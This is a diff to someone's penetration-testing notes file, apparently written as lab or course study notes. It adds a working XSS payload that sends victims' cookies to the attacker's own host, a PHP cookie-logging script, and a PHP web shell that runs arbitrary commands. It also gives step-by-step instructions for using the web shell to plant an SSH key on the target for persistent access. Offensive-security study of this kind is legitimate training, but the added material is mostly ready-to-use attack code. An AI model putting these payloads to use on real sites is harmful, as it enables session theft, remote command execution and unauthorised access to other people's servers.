@@ -39,10 +39,11 @@ can use (previous nmap scan) --script smb-os-dicovery.nse (for windows machines)
 
 nikto -host <ip address> (-port used if port is weird) can be used to get more website related information for an ip
 
+========================================== COOKIE STEALING ===========================================
 <script>document.location="<http://your opstation ip:8000/>"+document.cookie;</script>
 run python3 -m http.server on your opstation before embedding the above code into the website to receive the cookie you just captured
 
-cookie stealer file
+cookie stealer file (CookieSteal.php)
 <?php
 $cookie = $_GET["username"]
 $steal = fopen("/var/www/html/uploads/cookiefile.txt", "a+")
@@ -50,15 +51,31 @@ fwrite($steal, $cookie . "\n")
 fclose($steal)
 ?>
 
+(create a cookiefile.txt for the variable $steal)
+upload these files and then use <script>document.location="http://<ServerIP>/uploads/cookiestealer.php?username="+document.cookie;</script> on the vulnerable website using XXS
 
+webshell.php file
+<HTML><BODY>
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Send">
+</FORM>
+<pre>
+<?php
+if($_GET['cmd']) {
+  system($_GET['cmd']);
+}
+?>
+</pre>
+</BODY></HTML>
 
+to use this file also upload it to the vulnerable website to gain a basic shell on the box through the website
 
-
-
-
-
-
-
-
+use the webshell to get cmd injection which means you can run any command using ; <cmd to run>
+to gain access to the box using webshell: use whoami to see who you are then get your home directory
+after finding your directory do ssh-keygen -t rsa -b 4096 and pay attention to where the keys are gonna be saved with no passphrase(just hit enter twice)
+take the .ssh/id_rsa.pub and copy just the key into the previously discovered home folder for your account on the webshell
+on this home folder ; mkdir <absolute path to home directory>/.ssh then echo "your copied public key" > <your home directory>/.ssh/authorized_keys
+from here you should be able to ssh straight into the target from your box using ssh -i <where your private key is(ssh_rsa)> www-data@<target box>
 
 
